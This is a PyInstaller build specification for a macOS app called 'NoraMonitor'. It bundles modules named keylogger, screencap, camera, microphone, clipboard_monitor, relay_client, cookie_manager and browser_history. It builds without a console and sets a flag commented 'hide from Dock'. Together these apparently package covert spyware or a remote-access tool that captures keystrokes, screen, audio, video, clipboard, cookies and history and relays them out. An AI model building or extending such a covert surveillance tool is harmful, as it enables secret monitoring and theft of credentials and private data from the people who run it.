# -*- mode: python ; coding: utf-8 -*-
import os
from pathlib import Path

block_cipher = None

a = Analysis(
    ['app.py'],
    pathex=['.'],
    binaries=[],
    datas=[
        ('templates', 'templates'),
    ],
    hiddenimports=[
        # Flask / networking
        'flask', 'flask_socketio', 'engineio', 'socketio',
        'engineio.async_drivers.threading',
        'socketio.async_drivers.threading',
        'werkzeug', 'jinja2', 'itsdangerous', 'click',
        'bidict', 'simple_websocket', 'wsproto',
        # macOS-specific
        'mactools', 'mactools',
        'plistlib',
        'Quartz', 'AppKit', 'Foundation',
        # screen / input
        'mss', 'mss.darwin',
        'pyautogui', 'pynput', 'pynput.keyboard', 'pynput.mouse',
        'pynput.keyboard._darwin', 'pynput.mouse._darwin',
        # media
        'cv2', 'PIL', 'PIL.Image',
        'sounddevice', 'soundfile',
        # crypto
        'Cryptodome', 'Cryptodome.Cipher', 'Cryptodome.Cipher.AES',
        # data
        'psutil', 'sqlite3', 'pyperclip',
        # local modules
        'server', 'controller', 'screencap', 'keylogger',
        'clipboard_monitor', 'relay_client',
        'camera', 'microphone', 'recorder',
        'processes', 'file_manager', 'sysinfo',
        'windows_control', 'cookie_manager', 'browser_history',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='NoraMonitor',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=True,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)

coll = COLLECT(
    exe,
    a.binaries,
    a.zipfiles,
    a.datas,
    strip=False,
    upx=True,
    upx_exclude=[],
    name='NoraMonitor',
)

app = BUNDLE(
    coll,
    name='NoraMonitor.app',
    icon=None,
    bundle_identifier='com.nora.monitor',
    info_plist={
        'NSCameraUsageDescription':      'Nora Monitor needs camera access.',
        'NSMicrophoneUsageDescription':  'Nora Monitor needs microphone access.',
        'NSScreenCaptureDescription':    'Nora Monitor needs screen recording access.',
        'NSAppleEventsUsageDescription': 'Nora Monitor uses AppleScript for system control.',
        'CFBundleShortVersionString':    '1.0.0',
        'CFBundleVersion':               '1',
        'LSUIElement':                   True,   # hide from Dock
        'NSHighResolutionCapable':       True,
    },
)
